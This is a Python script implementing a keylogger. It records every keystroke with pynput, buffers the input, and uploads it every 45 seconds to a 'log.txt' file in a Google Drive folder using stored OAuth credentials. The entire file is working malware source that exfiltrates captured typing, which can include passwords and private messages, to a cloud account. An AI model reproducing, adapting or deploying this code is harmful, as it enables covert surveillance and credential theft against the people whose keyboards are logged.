from pydrive.auth import GoogleAuth
from pydrive.drive import GoogleDrive
from pynput.keyboard import Key, Listener
import threading
import os
import shutil
import time

#___Directory to access credentials___
current_wd = os.getcwd()
child_dir = 'dependencies'
child_dir_path = os.path.join(current_wd, child_dir)
# Get current working directory and append dependencies (child dir) to it
settings_file = os.path.join(child_dir_path, 'settings.yaml')
credentials = os.path.join(child_dir_path, 'credentials.json')
# Define files, client_secrets just needed to be there, while the other two needed to be called out to use

# Authentication to Google Drive
gauth = GoogleAuth(settings_file)
# Will authenticate with the defined settings in settings.yaml
gauth.LoadCredentialsFile(credentials)
# Get the credentials from the child directory to use
drive = GoogleDrive(gauth)
# Create a drive instance with the current authentication

#___Global Buffer___ 
# Variable to hold keystroke, will be used to prevent lagging from sending one keystroke to drive at a time
buffer = ""
buffer_lock = threading.Lock()

# ___File exists___
# # verify that the file exists, prints to terminal
# def file_exists(exact_file):
#     current_dir = os.getcwd()
#     child_dir = 'dependencies'
#     file_path = os.path.join(current_dir,child_dir)
# # List all files in the child folder
#     files_in_child_folder = os.listdir(os.path.join(current_dir, child_dir))
# # Check if the exact file exists in the child folder
#     if exact_file in files_in_child_folder:
# # Concatenate the path to the dependencies files
#         print("File "+ exact_file +" does exists " + "in "+ file_path)
#     else:
#         print(exact_file + " not found in the child folder.")

# file_exists(client_secrets_file)
# file_exists(credentials_file)
# file_exists(settings_file)
# print("\n")

#___Credentials management___
# Auto push newly created credentials.json to the dependencies folder 
def file_management(filename):
    list_file_in_cwd = os.listdir(current_wd)
    file = filename
    file_path = os.path.join(current_wd, file)
    if file in list_file_in_cwd:
        shutil.move(file_path, child_dir_path)
    else:
        print("All good!")

#___Log and listener___
def log_key(key):
    global buffer
    try:
        pressed_key = str(key.char)
# process normal keystrokes
    except AttributeError:
        if key == Key.space:
            pressed_key = " "
        elif key == Key.enter:
            pressed_key = " ↵\n"
        elif key == Key.tab:
            pressed_key = " ↹\t"
        elif key == Key.shift_l or key == Key.shift_r:
            pressed_key = ""
        elif key == Key.ctrl_l or key == Key.ctrl_r:
            pressed_key = "ctrl "
        elif key == Key.backspace:
            pressed_key = "← "
        elif key == Key.delete:
            pressed_key = "␡ "
        elif key == Key.up or key == Key.down or key == Key.left or key == Key.right: 
            pressed_key = ""
        else:
            pressed_key = " '" + str(key) + "' " 
# process special keystrokes
    with buffer_lock:
        buffer += pressed_key

def flush_buffer(file):
    global buffer
    with buffer_lock:
        if buffer:
            file.SetContentString(file.GetContentString() + buffer)
            file.Upload()
            buffer = ""
# Schedule the next flush, set for 45 seconds
    threading.Timer(45, flush_buffer, args=[file]).start()

def listener():
    listener = Listener(on_press = log_key)
    with listener:
        flush_buffer(file)
        listener.join()
# record keystrokes

#___Write to drive___
def create_file(drive):
    folder = 'string'
    file_list = drive.ListFile({'q': "'{}' in parents and trashed=false".format(folder)}).GetList()
    existing_file = next((file for file in file_list if file['title'] == 'log.txt'), None)
    if not existing_file:
        new_file = drive.CreateFile({'parents': [{'id': folder}], 'title': 'log.txt'})
        new_file.Upload()
        return new_file
    else:
        return existing_file
# this write keystroke to file
# this process is captured within the logger variable

#___Start___
file = create_file(drive)
time.sleep(10)
# Move credentials.json after 10 seconds of main.py running
listener()
# start keylogging



